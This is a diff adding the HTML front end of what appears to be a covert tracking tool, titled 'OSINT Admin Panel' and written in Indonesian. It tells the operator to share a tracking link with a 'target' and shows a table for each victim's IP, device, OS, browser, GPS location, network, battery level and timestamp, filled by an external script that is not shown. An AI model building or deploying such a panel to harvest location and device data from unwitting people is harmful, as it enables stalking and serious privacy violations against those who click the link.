@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSINT Admin Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        table { width: 100%; margin: auto; border-collapse: collapse; }
+        th, td { padding: 10px; border: 1px solid black; font-size: 14px; }
+        button { padding: 10px; margin: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h2>OSINT Admin Panel</h2>
+    
+    <p>Bagikan link ini ke target:</p>
+    <p><a href="track.html">Klik untuk tracking</a></p>
+
+    <h3>Data Target</h3>
+    <table>
+        <tr>
+            <th>IP</th>
+            <th>Perangkat</th>
+            <th>OS</th>
+            <th>Browser</th>
+            <th>Resolusi</th>
+            <th>GPS</th>
+            <th>Jaringan</th>
+            <th>Baterai</th>
+            <th>Waktu</th>
+        </tr>
+        <tbody id="dataTable"></tbody>
+    </table>
+
+    <button onclick="clearData()">Hapus Data</button>
+
+    <script src="script.js"></script>
+</body>
+</html>
